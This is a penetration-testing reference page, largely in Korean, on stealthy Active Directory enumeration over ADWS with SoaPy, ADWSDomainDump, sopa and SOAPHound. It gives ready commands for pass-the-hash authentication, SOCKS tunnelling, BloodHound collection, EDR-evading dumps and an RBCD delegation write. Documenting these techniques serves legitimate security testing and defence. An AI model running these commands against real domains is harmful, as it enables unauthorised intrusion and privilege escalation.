# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화되어 있으며** TCP **9389** 포트를 리스닝합니다. 이름과 달리 **HTTP는 관여하지 않습니다**. 대신, 서비스는 LDAP 스타일의 데이터를 독점적인 .NET 프레이밍 프로토콜 스택을 통해 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

이 트래픽은 이진 SOAP 프레임 내부에 캡슐화되어 있고 비표준 포트를 사용하기 때문에, **ADWS를 통한 열거는 고전적인 LDAP/389 & 636 트래픽보다 검사, 필터링 또는 시그니처 탐지 대상이 될 가능성이 훨씬 낮습니다**. 운영자에게는 다음과 같은 의미가 있습니다:

* 더 은밀한 정찰 – Blue teams는 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시를 통해 9389/TCP를 터널링함으로써 **non-Windows 호스트(Linux, macOS)** 에서 수집 가능.
* LDAP를 통해 얻을 수 있는 동일한 데이터(사용자, 그룹, ACL, 스키마 등)와 **쓰기** 기능(예: RBCD를 위한 `msDs-AllowedToActOnBehalfOfOtherIdentity`)을 수행할 수 있음.

ADWS 상호작용은 WS-Enumeration 위에서 구현됩니다: 모든 쿼리는 LDAP 필터/속성을 정의하는 `Enumerate` 메시지로 시작하여 `EnumerationContext` GUID를 반환하고, 이어서 서버가 정의한 결과 창만큼 스트리밍하는 하나 이상의 `Pull` 메시지가 옵니다. 컨텍스트는 약 ~30분 후에 만료되므로 도구는 결과를 페이징하거나 상태 손실을 피하기 위해 필터를 분할(예: CN별 접두사 쿼리)해야 합니다. 보안 설명자를 요청할 때는 SACL을 생략하려면 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정하세요. 그렇지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 단순히 제거합니다.

> 참고: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 정당한 관리자 활동과 섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) 는 **순수 Python으로 ADWS 프로토콜 스택을 완전히 재구현한 구현체**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 제작하여 .NET 런타임을 건드리지 않고 Unix 계열 시스템에서 수집할 수 있게 합니다.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy는 ADWS 상에서 가장 일반적인 LDAP 헌팅 작업을 복제하는 선별된 스위치를 제공합니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, 및 맞춤 풀을 위한 원시 `--query` / `--filter` 옵션. 이를 `--rbcd <source>`(sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>`(SPN staging for targeted Kerberoasting) 및 `--asrep`(flip `DONT_REQ_PREAUTH` in `userAccountControl`) 같은 쓰기 원시 연산과 조합하세요.

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
동일한 호스트/자격증명을 사용하여 findings를 즉시 weaponise하세요: RBCD-capable objects를 `--rbcds`로 dump한 다음 `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 적용해 Resource-Based Constrained Delegation chain을 stage하세요 (전체 abuse path는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

### 설치 (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump`의 포크로, LDAP 서명 탐지(hit)를 줄이기 위해 LDAP 쿼리를 TCP/9389의 ADWS 호출로 교체합니다.
* `--force`가 전달되지 않으면 9389에 대한 초기 도달성 확인을 수행합니다(포트 스캔이 탐지되기 쉽거나 필터링되는 경우 프로브를 건너뜁니다).
* Microsoft Defender for Endpoint 및 CrowdStrike Falcon을 대상으로 테스트되었으며 README에 우회 성공 사례가 있습니다.

### 설치
```bash
pipx install .
```
### 사용법
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
일반적인 출력은 9389 reachability check, ADWS bind, 및 dump start/finish를 로그로 남깁니다:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang으로 구현된 ADWS용 실용 클라이언트

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### 프로토콜 매핑 주요 포인트

* LDAP 스타일 검색은 **WS-Enumeration** (`Enumerate` + `Pull`)을 통해 수행되며, 속성 선택(프로젝션), 범위 제어 (Base/OneLevel/Subtree) 및 페이징을 지원합니다.
* 단일 객체 조회는 **WS-Transfer** `Get`을 사용; 속성 변경은 `Put`; 삭제는 `Delete`를 사용합니다.
* 내장 객체 생성은 **WS-Transfer ResourceFactory**를 사용; 커스텀 객체는 YAML 템플릿으로 구동되는 **IMDA AddRequest**를 사용합니다.
* 비밀번호 작업은 **MS-ADCAP** 액션 (`SetPassword`, `ChangePassword`)입니다.

### 인증 없이 메타데이터 검색 (mex)

ADWS는 자격 증명 없이 WS-MetadataExchange를 노출하며, 이는 인증하기 전에 노출 여부를 빠르게 확인하는 방법입니다:
```bash
sopa mex --dc <DC>
```
### DNS/DC 검색 및 Kerberos 대상 지정 메모

Sopa는 `--dc`가 생략되고 `--domain`이 제공되면 SRV를 통해 DC를 해결할 수 있습니다. 다음 순서로 질의하며 우선순위가 가장 높은 대상을 사용합니다:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
운영상, 분할된 환경에서 실패를 피하기 위해 DC가 제어하는 리졸버를 선호하세요:

* `--dns <DC-IP>`를 사용하여 **모든** SRV/PTR/정방향 조회가 DC의 DNS를 통하도록 하세요.
* UDP가 차단되었거나 SRV 응답이 큰 경우 `--dns-tcp`를 사용하세요.
* Kerberos가 활성화되어 있고 `--dc`가 IP인 경우, sopa는 올바른 SPN/KDC 타겟팅을 위해 FQDN을 얻기 위해 **reverse PTR**을 수행합니다. Kerberos를 사용하지 않으면 PTR 조회는 수행되지 않습니다.

Example (IP + Kerberos, forced DNS via the DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### 인증 자격 옵션

평문 암호 외에도, sopa는 ADWS auth를 위해 **NT hashes**, **Kerberos AES keys**, **ccache**, 및 **PKINIT certificates** (PFX or PEM)을 지원합니다. `--aes-key`, `-c` (ccache) 또는 인증서 기반 옵션을 사용할 때 Kerberos가 적용됩니다.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Custom object creation via templates

임의의 객체 클래스의 경우, `create custom` 명령은 IMDA `AddRequest`에 매핑되는 YAML 템플릿을 사용합니다:

* `parentDN`과 `rdn`은 컨테이너와 상대 DN을 정의합니다.
* `attributes[].name`은 `cn` 또는 네임스페이스된 `addata:cn`을 지원합니다.
* `attributes[].type`은 `string|int|bool|base64|hex` 또는 명시적인 `xsd:*`를 허용합니다.
* `ad:relativeDistinguishedName` 또는 `ad:container-hierarchy-parent`를 포함하지 마십시오; sopa가 이를 주입합니다.
* `hex` 값은 `xsd:base64Binary`로 변환됩니다; 빈 문자열을 설정하려면 `value: ""`을 사용하세요.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 LDAP 상호작용을 모두 ADWS 내부에 유지하고 BloodHound v4 호환 JSON을 생성하는 .NET 수집기입니다. 이 도구는 한 번 (`--buildcache`) `objectSid`, `objectGUID`, `distinguishedName` 및 `objectClass`의 전체 캐시를 구축한 다음, 이를 재사용하여 대량의 `--bhdump`, `--certdump` (ADCS) 또는 `--dnsdump` (AD-integrated DNS) 진행을 수행하므로 DC에서 나가는 속성은 약 35개의 중요 속성으로 제한됩니다. AutoSplit (`--autosplit --threshold <N>`)은 대형 포리스트에서 EnumerationContext의 30분 타임아웃을 벗어나지 않도록 CN 접두사별로 쿼리를 자동으로 분할(shard)합니다.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON은 SharpHound/BloodHound 워크플로우에 직접 투입할 수 있습니다—하위 그래프화 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit은 SOAPHound를 수백만 개 객체의 포리스트에서도 강건하게 만들며 쿼리 수를 ADExplorer-style 스냅샷보다 낮게 유지합니다.

## 스텔스 AD 수집 워크플로우

다음 워크플로우는 ADWS를 통해 **도메인 & ADCS 객체**를 열거하고, 이를 BloodHound JSON으로 변환한 뒤 인증서 기반 공격 경로를 탐색하는 방법을 보여줍니다 — 모두 Linux에서 실행합니다:

1. **Tunnel 9389/TCP**를 타깃 네트워크에서 자신의 머신으로 터널링합니다(예: Chisel, Meterpreter, SSH dynamic port-forward 등).  `export HTTPS_PROXY=socks5://127.0.0.1:1080`를 설정하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용하세요.

2. **루트 도메인 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound으로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP**을 BloodHound GUI에 업로드하고 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### 작성 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
이걸 `s4u2proxy`/`Rubeus /getticket`와 결합하면 전체 **Resource-Based Constrained Delegation** 체인을 구성할 수 있습니다 (자세한 내용은 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

## 도구 요약

| 목적 | 도구 | 비고 |
|---------|------|-------|
| ADWS 열거 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, 읽기/쓰기 |
| 대량 ADWS 덤프 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, 캐시 우선, BH/ADCS/DNS 모드 |
| BloodHound 수집 | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그를 변환 |
| 인증서 탈취 | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 프록시 가능 |
| ADWS 열거 및 객체 변경 | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS 엔드포인트와 인터페이스하는 일반 클라이언트 - 열거, 객체 생성, 속성 수정 및 비밀번호 변경 허용 |

## 참고

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
